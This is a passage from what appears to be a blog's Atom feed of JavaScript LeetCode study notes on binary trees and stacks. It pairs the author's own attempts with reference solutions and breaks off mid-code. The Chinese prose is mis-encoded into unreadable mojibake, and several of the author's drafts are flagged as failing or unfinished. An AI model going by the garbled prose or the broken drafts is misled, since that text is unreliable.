title="LeetCode112â€”â€”è·¯å¾„æ€»å’Œï¼ˆâ˜†ï¼‰"></a>LeetCode112â€”â€”è·¯å¾„æ€»å’Œï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/path-sum/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -10"><a href="#è‡ªå·±çš„ä»£ç -10" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, targetSum</span>) </span></span><br><span class="line"><span class="function">    <span class="title">let</span> <span class="title">res</span> = <span class="title">false</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> dfsTree = <span class="function"><span class="keyword">function</span> (<span class="params">node, curSum</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        curSum += node.val;</span><br><span class="line">        <span class="keyword">if</span> (curSum === targetSum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left &amp;&amp; dfsTree(node.left, curSum);</span><br><span class="line">        node.right &amp;&amp; dfsTree(node.right, curSum);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    res = dfsTree(root, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡é€šè¿‡ï¼Œè¾“å‡º undefined ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-8"><a href="#æ€è·¯1-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼Œé€šè¿‡æ”¹å˜ targetSum è¿›è¡Œé€’å½’ï¼Œä¸å¿…è‡ªå·±å¼„ä¸€ä¸ªå€¼ï¼Œç„¶åä¸æ–­ç´¯ç§¯ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, targetSum</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!root.left &amp;&amp; !root.right) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.val === targetSum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hasPathSum(root.left, targetSum - root.val) || hasPathSum(root.right, targetSum - root.val);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-2"><a href="#å¤æ‚åº¦åˆ†æ-2" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦O(N)ï¼šå…¶ä¸­ N æ˜¯æ ‘çš„èŠ‚ç‚¹æ•°ã€‚å¯¹æ¯ä¸ªèŠ‚ç‚¹è®¿é—®ä¸€æ¬¡ã€‚</li><li>ç©ºé—´å¤æ‚åº¦O(H)ï¼šå…¶ä¸­ H æ˜¯æ ‘çš„é«˜åº¦ã€‚ç©ºé—´å¤æ‚åº¦ä¸»è¦å–å†³äºé€’å½’æ—¶æ ˆç©ºé—´çš„å¼€é”€ï¼Œæœ€åæƒ…å†µä¸‹ï¼Œæ ‘å‘ˆç°é“¾çŠ¶ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(N)ã€‚å¹³å‡æƒ…å†µä¸‹æ ‘çš„é«˜åº¦ä¸èŠ‚ç‚¹æ•°çš„å¯¹æ•°æ­£ç›¸å…³ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(logN)ã€‚</li></ul><h2 id="LeetCode226â€”â€”ç¿»è½¬äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"><a href="#LeetCode226â€”â€”ç¿»è½¬äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode226â€”â€”ç¿»è½¬äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"></a>LeetCode226â€”â€”ç¿»è½¬äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -11"><a href="#è‡ªå·±çš„ä»£ç -11" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ç«Ÿç„¶æ²¡æœ‰æ€è·¯ï¼Œå“ã€‚æƒ³ç€æ˜¯å…ˆå·¦å³ä¸­çš„é¡ºåºå¾—åˆ°äºŒå‰æ ‘çš„èŠ‚ç‚¹ï¼Œç„¶åé€šè¿‡èŠ‚ç‚¹åˆ—è¡¨ä»¥å³å·¦ä¸­çš„é¡ºåºæ„é€ äºŒå‰æ ‘ï¼Œä½†è¿™æ ·éš¾åº¦æ˜æ˜¾å¢å¤§ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-9"><a href="#æ€è·¯1-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><ul><li><p>é¦–å…ˆé€’å½’å‡½æ•°ä¼šèµ°åˆ°åº•ï¼Œé‡åˆ° root == nullï¼Œ å‘ç°å¶å­èŠ‚ç‚¹æ²¡æœ‰root.leftã€root.rightï¼Œæ‰§è¡Œä¸ºç©ºã€‚</p></li><li><p>å›é€€ï¼Œåœ¨ç¬¬äºŒå±‚çš„èŠ‚ç‚¹ï¼Œå‘ç°æœ‰ root.leftã€root.right äº†ï¼Œå¼€å§‹ç¿»è½¬ï¼ˆ<strong>å·¦å³èŠ‚ç‚¹</strong>ï¼‰ã€‚</p></li></ul><ul><li>åœ¨ç¬¬ä¸€æ¬¡æ ¹èŠ‚ç‚¹ï¼Œç»§ç»­ç¿»è½¬ï¼ˆ<strong>å·¦å³å­æ ‘</strong>ï¼‰ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> invertTree = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">const</span> left = invertTree(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = invertTree(root.right);</span><br><span class="line">    root.left = right;</span><br><span class="line">    root.right = left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-9"><a href="#æ€è·¯2-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">invertTree</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stack = [root];</span><br><span class="line">  <span class="keyword">while</span> (stack.length) &#123;</span><br><span class="line">    <span class="keyword">const</span> n = stack.pop();</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="literal">null</span>) &#123;</span><br><span class="line">      [n.left, n.right] = [n.right, n.left];</span><br><span class="line">      stack.push(n.left, n.right);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode106â€”â€”ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode106â€”â€”ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode106â€”â€”ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode106â€”â€”ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -12"><a href="#è‡ªå·±çš„ä»£ç -12" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å¤§è‡´æ€è·¯ç†è§£ï¼Œååºéå†çš„æœ€åä¸€ä¸ªå€¼å³ä¸ºæ ¹èŠ‚ç‚¹ï¼Œç„¶ååœ¨ä¸­åºéå†ä¸­ä»¥æ ¹èŠ‚ç‚¹ä¸ºç•Œï¼Œå·¦è¾¹å°±æ˜¯å·¦å­æ ‘ï¼Œå³è¾¹å°±æ˜¯å³å­æ ‘ï¼Œå†è¿›è¡Œé€’å½’ã€‚å¯æ˜¯ä¸ä¼šç”¨ä»£ç æè¿°ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-4"><a href="#æ€è·¯-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buildTree = <span class="function"><span class="keyword">function</span> (<span class="params">inorder, postorder</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!inorder.length) &#123;<span class="keyword">return</span> <span class="literal">null</span>&#125;;</span><br><span class="line">  <span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(postorder[postorder.length-<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> mid = inorder.indexOf(postorder.pop());</span><br><span class="line">  <span class="comment">//å·¦å³å­æ ‘é€’å½’</span></span><br><span class="line">  root.left = buildTree(inorder.slice(<span class="number">0</span>, mid), postorder.slice(<span class="number">0</span>, mid));</span><br><span class="line">  root.right = buildTree(inorder.slice(mid + <span class="number">1</span>), postorder.slice(mid));</span><br><span class="line">  <span class="keyword">return</span> root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ€è·¯æ²¡é”™ï¼Œä½†æ˜¯è¿™æœ€åæœ‰ç‚¹æ²¡çœ‹æ‡‚ã€‚ã€‚</p><h2 id="LeetCode105â€”â€”ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode105â€”â€”ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode105â€”â€”ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode105â€”â€”ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">è·³è½¬åœ°å€</a></p><h3 id="æ€è·¯-amp-é¢˜è§£-5"><a href="#æ€è·¯-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buildTree = <span class="function"><span class="keyword">function</span>(<span class="params">preorder, inorder</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!preorder.length || !inorder.length) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// æ ¹èŠ‚ç‚¹</span></span><br><span class="line">  <span class="keyword">let</span> node = <span class="keyword">new</span> TreeNode(preorder[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">//æ‰¾åˆ°preoder[0]å¯¹åº”inorderä¸­çš„ä½ç½®</span></span><br><span class="line">  <span class="keyword">let</span> index = inorder.indexOf(preorder.shift());</span><br><span class="line">  <span class="comment">//å·¦å³å­æ ‘é€’å½’</span></span><br><span class="line">  node.left = buildTree(preorder, inorder.slice(<span class="number">0</span>, index));</span><br><span class="line">  node.right = buildTree(preorder, inorder.slice(index + <span class="number">1</span>));</span><br><span class="line">  <span class="comment">//è¿”å›æ ¹èŠ‚ç‚¹</span></span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode617â€”â€”åˆå¹¶äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"><a href="#LeetCode617â€”â€”åˆå¹¶äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode617â€”â€”åˆå¹¶äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰"></a>LeetCode617â€”â€”åˆå¹¶äºŒå‰æ ‘ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -13"><a href="#è‡ªå·±çš„ä»£ç -13" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTrees = <span class="function"><span class="keyword">function</span>(<span class="params">root1, root2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root1.left &amp;&amp; !root1.right &amp;&amp;!root2.left &amp;&amp;!root2.right) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root1 &amp;&amp; root2) &#123;</span><br><span class="line">        root1.val += root2.val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡å†™å®Œï¼Œæ„Ÿè§‰å¯¹ä¸´ç•Œæ¡ä»¶çš„åˆ¤æ–­è¿˜æ˜¯å¾ˆä¹±å¾ˆä¹±ã€‚æƒ³çš„æƒ…å†µå¤ªå¤šäº†ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-6"><a href="#æ€è·¯-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTrees = <span class="function"><span class="keyword">function</span> (<span class="params">root1, root2</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 2.ç»ˆæ­¢æ¡ä»¶ï¼šå¦‚æœt1 == NULL ï¼Œä¸¤ä¸ªæ ‘åˆå¹¶å°±æ˜¯ t2ã€‚åè¿‡æ¥å¦‚æœt2 == NULLï¼Œé‚£ä¹ˆä¸¤ä¸ªæ•°åˆå¹¶å°±æ˜¯t1ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (!root1) &#123;</span><br><span class="line">        <span class="keyword">return</span> root2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!root2) &#123;</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.å•å±‚é€’å½’é€»è¾‘ï¼ˆå¥½åƒä¸ç”¨è€ƒè™‘root2.valæ˜¯å¦å­˜åœ¨ï¼Ÿï¼‰</span></span><br><span class="line">    root1.val += root2.val;</span><br><span class="line">    root1.left = mergeTrees(root1.left, root2.left);</span><br><span class="line">    root1.right = mergeTrees(root1.right, root2.right);</span><br><span class="line">    <span class="keyword">return</span> root1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode98â€”â€”éªŒè¯äºŒå‰æœç´¢æ ‘ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode98â€”â€”éªŒè¯äºŒå‰æœç´¢æ ‘ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode98â€”â€”éªŒè¯äºŒå‰æœç´¢æ ‘ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode98â€”â€”éªŒè¯äºŒå‰æœç´¢æ ‘ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -14"><a href="#è‡ªå·±çš„ä»£ç -14" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å®Œå…¨æ²¡å¤´ç»ªã€‚</p><p>çœ‹äº†ä¸€çœ¼é¢˜è§£ï¼ŒåŸæ¥å¯ä»¥ç”¨ä¸­åºéå†çš„æ–¹æ³•åˆ¤æ–­æ˜¯ä¸æ˜¯å‡åºå°±è¡Œï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidBST = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">const</span> inOrder = <span class="function"><span class="keyword">function</span> (<span class="params">root, res=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    inOrder(root.left, res);</span><br><span class="line">    res.push(root.val);</span><br><span class="line">    inOrder(root.right, res);</span><br><span class="line">  &#125;</span><br><span class="line">  inOrder(root, arr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt;= arr[i + <span class="number">1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-10"><a href="#æ€è·¯2-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>é€’å½’ï¼š(å†™å¾—ä¹Ÿå¤ªå·§äº†)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidBST = <span class="function"><span class="keyword">function</span>(<span class="params">root, min = -<span class="literal">Infinity</span>, max = <span class="literal">Infinity</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (min &amp;&amp; root.val &lt;= min.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (max &amp;&amp; root.val &gt;= max.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> isValidBST(root.left, min, root) &amp;&amp; isValidBST(root.right, root, max);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode236â€”â€”äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode236â€”â€”äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode236â€”â€”äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode236â€”â€”äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆâ˜†â˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -15"><a href="#è‡ªå·±çš„ä»£ç -15" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>ä¸ä¼šã€‚ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-7"><a href="#æ€è·¯-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>å¯¹äºæ ¹èŠ‚ç‚¹ rootï¼Œpã€q çš„åˆ†å¸ƒï¼Œæœ‰ä¸¤ç§å¯èƒ½ï¼š</p><ul><li>pã€q åˆ†å±… root çš„å·¦å³å­æ ‘ï¼Œåˆ™æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆLCAï¼‰ ä¸º rootã€‚</li><li>pã€q å­˜åœ¨äº root çš„åŒä¸€ä¾§å­æ ‘ä¸­ï¼Œå°±å˜æˆè§„æ¨¡å°ä¸€ç‚¹çš„ç›¸åŒé—®é¢˜ã€‚</li></ul><p>ä»æ ¹èŠ‚ç‚¹ root å¼€å§‹å¾€ä¸‹é€’å½’éå†ï¼š</p><ul><li><p>éå†åˆ° p æˆ– qï¼Œæ¯”å¦‚ pï¼Œåˆ™ LCA è¦ä¹ˆæ˜¯å½“å‰çš„ pï¼ˆq åœ¨ p çš„å­æ ‘ä¸­ï¼‰ï¼Œè¦ä¹ˆæ˜¯ p ä¹‹ä¸Šçš„èŠ‚ç‚¹ï¼ˆq ä¸åœ¨ p çš„å­æ ‘ä¸­ï¼‰ï¼Œä¸å¯èƒ½æ˜¯ p ä¹‹ä¸‹çš„èŠ‚ç‚¹ï¼Œå› æ­¤è¿”å›å½“å‰çš„ pã€‚</p></li><li><p>å½“éå†åˆ° null èŠ‚ç‚¹ï¼Œæ²¡æœ‰ LCAï¼Œè¿”å› nullã€‚</p></li><li><p>å½“éå†çš„èŠ‚ç‚¹ root ä¸æ˜¯ p æˆ– q æˆ– nullï¼Œåˆ™é€’å½’æœå¯» root çš„å·¦å³å­æ ‘ï¼š</p><ul><li>å¦‚æœå·¦å³å­æ ‘çš„é€’å½’éƒ½æœ‰ç»“æœï¼Œè¯´æ˜ p å’Œ q åˆ†å±… root çš„å·¦å³å­æ ‘ï¼Œè¿”å› rootã€‚</li><li>å¦‚æœåªæ˜¯ä¸€ä¸ªå­æ ‘é€’å½’è°ƒç”¨æœ‰ç»“æœï¼Œè¯´æ˜ p å’Œ q éƒ½åœ¨è¿™ä¸ªå­æ ‘ï¼Œè¿”å›è¯¥å­æ ‘é€’å½’ç»“æœã€‚</li><li>å¦‚æœä¸¤ä¸ªå­æ ‘é€’å½’ç»“æœéƒ½ä¸º nullï¼Œè¯´æ˜ p å’Œ q éƒ½ä¸åœ¨è¿™ä¿©å­æ ‘ä¸­ï¼Œè¿”å› nullã€‚</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lowestCommonAncestor = <span class="function"><span class="keyword">function</span>(<span class="params">root, p, q</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!root || root === q || root === p)  <span class="keyword">return</span> root;</span><br><span class="line">  <span class="comment">// énull éq épï¼Œåˆ™é€’å½’å·¦å³å­æ ‘</span></span><br><span class="line">  <span class="keyword">let</span> left = lowestCommonAncestor(root.left, p, q);</span><br><span class="line">  <span class="keyword">let</span> right = lowestCommonAncestor(root.right, p, q);</span><br><span class="line">  <span class="comment">// æ ¹æ®é€’å½’çš„ç»“æœï¼Œå†³å®šè°æ˜¯LCA</span></span><br><span class="line">  <span class="keyword">if</span> (left &amp;&amp; right) &#123;</span><br><span class="line">      <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> left ? left : right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰&quot;&gt;&lt;a href=&quot;#LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;LeetCode144â€”â€”äºŒå‰æ ‘çš„å‰åºéå†ï¼ˆâ˜†ï¼‰&quot;&gt;&lt;/a&gt;LeetCode144â€”â€”äºŒ</summary>
      
    
    
    
    <category term="æ•°æ®ç»“æ„" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="äºŒå‰æ ‘" scheme="http://example.com/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ•°æ®ç»“æ„ã€‘â€” â€” æ ˆå’Œé˜Ÿåˆ—</title>
    <link href="http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <id>http://example.com/2021/06/11/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E2%80%94%20%E2%80%94%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</id>
    <published>2021-06-11T19:41:56.000Z</published>
    <updated>2021-08-13T06:52:15.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰"><a href="#LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰"></a>LeetCode20â€”â€”æœ‰æ•ˆçš„æ‹¬å·ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-parentheses/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç "><a href="#è‡ªå·±çš„ä»£ç " class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;[&#x27;</span> || s[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            stack.push(s[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s[i])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.length==<span class="number">0</span>?<span class="literal">true</span>:<span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åˆè‡­åˆé•¿ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£"><a href="#æ€è·¯-amp-é¢˜è§£" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;   </span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; s.length ; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> c = s.charAt(i);</span><br><span class="line">        <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>: stack.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>: stack.push(<span 